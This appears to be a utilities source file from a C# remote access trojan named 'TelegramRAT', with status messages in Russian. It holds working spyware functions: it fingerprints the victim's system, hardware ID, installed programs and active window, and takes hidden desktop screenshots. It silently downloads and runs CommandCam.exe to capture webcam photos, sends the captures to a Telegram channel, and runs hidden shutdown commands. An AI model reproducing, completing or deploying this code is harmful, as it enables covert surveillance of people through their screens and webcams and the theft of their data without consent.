using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;



namespace TelegramRAT
{
    internal static class utils
    {
        private static string CurrentActiveWindowTitle;

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static string GetProgramsList()
        {
            List<string> programs = new List<string>();

            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }
            foreach (string program in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles)))
            {
                programs.Add(new DirectoryInfo(program).Name);
            }

            return string.Join(", ", programs) + ".";

        }
        private static string GetWindowsVersionName()
        {
            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
            {
                string sData = string.Empty;
                foreach (ManagementObject tObj in mSearcher.Get())
                {
                    sData = Convert.ToString(tObj["Name"]);
                }
                try
                {
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
                catch { sData = "Unknown System"; }
                return sData;
            }
        }
        private static string getBitVersion()
        {
            if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86"))
            {
                return "(32 Bit)";
            }
            else
            {
                return "(64 Bit)";
            }
        }
        public static string GetSystemVersion()
        {
            return (GetWindowsVersionName() + Convert.ToChar(0x20) + getBitVersion());
        }

        public static string GetCPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }


        public static string GetGPUName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    return mObject["Name"].ToString();
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        public static int GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576);
                        break;
                    }
                }
                return RamAmount;
            }
            catch
            {
                return -1;
            }
        }

        public static string GetHWID()
        {
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
                {
                    foreach (ManagementObject mObject in mSearcher.Get())
                    {
                        return mObject["ProcessorId"].ToString();
                    }
                }
                return "Unknown";
            }
            catch { return "Unknown"; }
        }

        public static void webcamScreenshot(string delay, string camera)
        {
            string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
            string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
            string filename = "webcam.png";
            if (!File.Exists(commandCamPATH))
            {
                telegram.sendText("📷 Загрузка CommandCam...");
                WebClient webClient = new WebClient();
                webClient.DownloadFile(commandCamLINK, commandCamPATH);
                telegram.sendText("📷 CommandCam загружена!");
            }
            else
            {
                telegram.sendText("📷 CommandCam загружена");
            }
            telegram.sendText($"📹 Создание скриншота с камеры {camera}");
            if (File.Exists(filename))
            {
                File.Delete(filename);
            }
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = commandCamPATH;
            startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            if (!File.Exists(filename))
            {
                telegram.sendText("📷 Камера не найдена!");
                return;
            }
            telegram.sendImage(filename);
            File.Delete(filename);
        }

        public static void desktopScreenshot()
        {
            string filename = "screenshot.png";
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
            telegram.sendImage(filename);
            File.Delete(filename);
        }


        public static string batteryStatus()
        {
            try
            {
                return SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
            }
            catch { return "Unknown"; }
        }

        public static string batteryPercent()
        {
            try
            {
                string[] batteryLife = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(',');
                return batteryLife[batteryLife.Length - 1];
            }
            catch { return "Unknown"; }
        }
        public static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }
        public static void PowerCommand(string args)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "shutdown.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
